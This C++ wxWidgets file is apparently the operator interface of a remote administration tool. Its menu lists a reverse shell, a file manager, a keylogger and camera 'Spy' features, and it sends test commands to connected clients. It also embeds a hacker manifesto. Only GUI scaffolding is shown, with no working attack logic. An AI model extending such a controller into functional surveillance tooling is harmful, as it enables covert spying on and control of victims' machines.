#include "frame_client.hpp"
#include "server.hpp"
#include "misc.hpp"

extern Servidor* p_Servidor;
extern std::mutex vector_mutex;

FrameCliente::FrameCliente(std::string strID, int iID)
    : wxFrame(nullptr, iID, ":v")
{

    std::vector<std::string> vcOut = strSplit(strID, '/', 1);
    this->strClienteID = vcOut[0];

    std::unique_lock<std::mutex> lock(vector_mutex);
    for (auto iter = p_Servidor->vc_Clientes.begin(); iter != p_Servidor->vc_Clientes.end();) {
        if (iter->_id == this->strClienteID) {
            iter->_isBusy = true;
            break;
        }
        ++iter;
    }
    lock.unlock();

    
    wxString strTitle = "[";
    strTitle.append(strID.c_str());
    strTitle.append("] - Admin");
    this->SetTitle(strTitle);
    
    wxPanel* pnl_Left = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(200, 450));
    pnl_Left->SetBackgroundColour(wxColor(255, 0, 0));

    wxPanel* pnl_Right = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(600, 450));
    pnl_Right->SetBackgroundColour(wxColor(0, 255, 0));
    
    this->m_tree = new MyTreeCtrl(pnl_Left, EnumIDS::TreeCtrl_ID,
        wxDefaultPosition, wxSize(200, 450));

    wxTreeItemId rootC = this->m_tree->AddRoot(wxT("CLI"));
    
    wxTreeItemId rootAdmin = this->m_tree->AppendItem(rootC, wxT("[Admin]"));
    wxTreeItemId rootSurveilance = this->m_tree->AppendItem(rootC, wxT("[Spy]"));
    wxTreeItemId rootMisc = this->m_tree->AppendItem(rootC, wxT("[Misc]"));

    this->m_tree->AppendItem(rootAdmin, wxT("Reverse Shell"));
    this->m_tree->AppendItem(rootAdmin, wxT("Administrador de archivos"));

    this->m_tree->AppendItem(rootSurveilance, wxT("Keylogger"));
    this->m_tree->AppendItem(rootSurveilance, wxT("Camara"));
    
    this->m_tree->AppendItem(rootMisc, wxT("Testing"));

    this->m_tree->p_Notebook = new wxAuiNotebook(pnl_Right, wxID_ANY, wxDefaultPosition, wxSize(600, 450),
        wxAUI_NB_CLOSE_ON_ACTIVE_TAB | wxAUI_NB_DEFAULT_STYLE | wxAUI_NB_TAB_EXTERNAL_MOVE | wxNO_BORDER);

    wxHtmlWindow* html = new wxHtmlWindow(this->m_tree->p_Notebook, wxID_ANY, wxDefaultPosition, wxSize(200, 200));
    html->SetBackgroundColour(wxColor(0, 0, 255));
    wxString htmlsource = "<center><p>Este es mi mundo. El mundo del electrón y el interruptor, la belleza del baudio. Hacemos uso de un servicio existente, sin pagar por él, que podría ser asquerosamen- te barato si no estuviera gestionado por explotadores glotones, y ustedes nos llaman criminales.<br>\
Nosotros exploramos y nos llaman criminales.<br>\
Buscamos el conocimiento y nos llaman criminales.<br>\
No tenemos razas, nacionalidades, prejuicios religiosos y nos llaman criminales.<br>\
Ustedes construyen bombas atómicas, delcaran guerras, asesinan, defraudan, y nos mienten, y nos tratan de hacer creer que es por nuestro bien, todavía somos los criminales.<br>\
Sí soy un criminal. Mi crimen es la curiosidad. Mi crimen es juzgar a la gente por lo que dice y piensa, no por lo que parece. Mi crimen es que soy más listo que tu, algo que no me puedes perdonar.<br>\
Soy un hacker, y este es mi manifiesto.<br>\
Me pueden detener a mí, pero no nos pueden detenernos a todos, al fin y al cabo todos somos iguales.\</p></center>";
    html->SetPage(htmlsource);
    html->SetSize(wxSize(200, 200));

    this->m_tree->p_Notebook->Freeze();
    this->m_tree->p_Notebook->AddPage(html, ":v", true);
    this->m_tree->p_Notebook->Thaw();
    
    wxBoxSizer* sizer = new wxBoxSizer(wxHORIZONTAL);

    sizer->Add(pnl_Left, 0, wxALL, 2);
    sizer->Add(pnl_Right, 1, wxALL, 1);
    

    this->SetSizerAndFit(sizer);

    SetClientSize(800, 450);
    SetSizeHints(820, 485, 820, 485);
    
    //this->btn_Test = new wxButton(pnl_Right, EnumIDS::ID_FrameClienteTest, "EXEC");



}

void FrameCliente::OnTest(wxCommandEvent& event) {
    std::vector<struct Cliente> vc_Copy;
    std::unique_lock<std::mutex> lock(vector_mutex);
    vc_Copy = p_Servidor->vc_Clientes;
    lock.unlock();

    for (auto aClient : vc_Copy) {
        if (aClient._id == this->strClienteID) {
            int ib = p_Servidor->cSend(aClient._sckCliente, "CUSTOM_TEST~0", 13, 0, false);
            std::cout << "SENT " << ib << "\n";
            break;
        }
    }
}

void FrameCliente::OnClose(wxCloseEvent& event) {
    std::lock_guard<std::mutex> lock(vector_mutex);
    for (auto iter = p_Servidor->vc_Clientes.begin(); iter != p_Servidor->vc_Clientes.end();) {
        if (iter->_id == this->strClienteID) {
            iter->_isBusy = false;
            iter->_ttUltimaVez = time(0);
            break;
        }
        ++iter;
    }

    event.Skip();
}

void MyTreeCtrl::CrearNotebook() {
    this->p_Notebook = new wxAuiNotebook(this, wxID_ANY, wxDefaultPosition, wxDefaultSize, 
        wxAUI_NB_CLOSE_ON_ACTIVE_TAB);

    this->p_Notebook->Freeze();
    wxPanel *m_BPanel = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(100, 150));
    m_BPanel->SetBackgroundColour(wxColor(0, 255, 0)); // REMOVE AT THE END

    this->p_Notebook->AddPage(m_BPanel, "Testing", false);
    /*this->p_Notebook->AddPage(new wxTextCtrl(ctrl, wxID_ANY, "Some text",
        wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE | wxNO_BORDER), "wxTextCtrl 1", false);

    this->p_Notebook->AddPage(new wxTextCtrl(ctrl, wxID_ANY, "Some more text",
        wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE | wxNO_BORDER), "wxTextCtrl 2");

    this->p_Notebook->AddPage(new wxTextCtrl(ctrl, wxID_ANY, "Some more text",
        wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE | wxNO_BORDER), "wxTextCtrl 3");*/
    this->p_Notebook->Thaw();
   
}

void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
    wxTreeItemId itemID = event.GetItem();
    wxString wStr = GetItemText(itemID);

    std::cout<<GetItemText(itemID).ToStdString()<<"\n";
    bool isFound = false;
    for (int i = 0; i < this->p_Notebook->GetPageCount(); i++) {
        if (this->p_Notebook->GetPageText(i) == wStr) {
            this->p_Notebook->GetPage(i)->SetFocus();
            isFound = true;
            break;
        }
    }
    //GetPageCount
    if (wStr[0] != '[' && isFound == false) {
        this->p_Notebook->Freeze();

        if (wStr == "Testing") {
            this->p_Notebook->AddPage(new panelTest(this), wStr, true);
        }
        //this->p_Notebook->AddPage(new wxTextCtrl(this->p_Notebook, wxID_ANY, wStr, wxDefaultPosition, wxDefaultSize, wxNO_BORDER), wStr, true);
        
        this->p_Notebook->Thaw();
    } 
}


//Modulos
panelTest::panelTest(wxWindow* pParent) :
    wxPanel(pParent) {
    wxButton* btn_Test = new wxButton(this, EnumIDS::ID_FrameClienteTest, "EXEC");
}